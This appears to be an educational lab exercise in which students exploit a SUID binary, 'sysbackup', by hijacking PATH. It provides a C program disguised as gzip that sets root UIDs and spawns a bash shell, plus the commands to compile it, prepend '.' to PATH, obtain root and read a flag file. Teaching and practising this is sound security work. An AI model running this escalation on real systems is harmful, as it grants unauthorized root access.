# Activity 2: Privilege Escalation I – PATH-Based SUID Exploitation

## Objective
Exploit a SUID binary that executes external commands unsafely using the PATH environment variable.

## Background
When a program executes a command without specifying an absolute path, Linux searches for that command using the PATH variable.
Linux searches directories in PATH from left to right. The first matching executable is used.
If a root-owned SUID binary relies on PATH and a user can influence PATH, the user may control what gets executed as root.

## Instructions

### 1. Analyzing the SUID Binary
Your target SUID binary is `sysbackup`. Analyze its behavior:
```bash
strings /usr/local/bin/sysbackup
```

Look for:
- External command names.
- Commands executed **without absolute paths**.

You should find that `sysbackup` calls `gzip` directly (e.g., `system("gzip ...")`).

### 2. Creating a Malicious Replacement Binary
You need to create a malicious binary named `gzip` that will be executed instead of the real one. 
Create a file named `gzip.c` in `/home/labDirectory` with the following content:

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setresuid(0, 0, 0); // Ensure we retain root privileges
    system("/bin/bash"); // Spawn a root shell
    return 0;
}
```

**Why setresuid(0,0,0)?**
Some shells drop privileges if UIDs do not match. This ensures root privileges are kept before spawning the shell.

### 3. Compile and Prepare
Compile your malicious code:
```bash
gcc gzip.c -o gzip
chmod +x gzip
```

### 4. Modifying PATH and Verifying
Prepend your current directory (`.`) to the PATH variable so your malicious `gzip` is found first:
```bash
export PATH=.:$PATH
```

Verify command resolution using `which`:
```bash
which gzip
```
Ensure it points to `/home/labDirectory/gzip`, not `/bin/gzip`.

### 5. Exploiting the Vulnerability
Execute the SUID binary again:
```bash
/usr/local/bin/sysbackup
```

If successful, you will be dropped into a root shell. Verify your identity:
```bash
id
```
Your UID should be 0 (root).

### 6. Retrieve the Flag
Read the flag:
```bash
cat /root/flag.txt
```

**Submission:**
Copy the flag you found into the `SUBMIT_FLAG_HERE.txt` file in your main directory and click **Evaluate**.
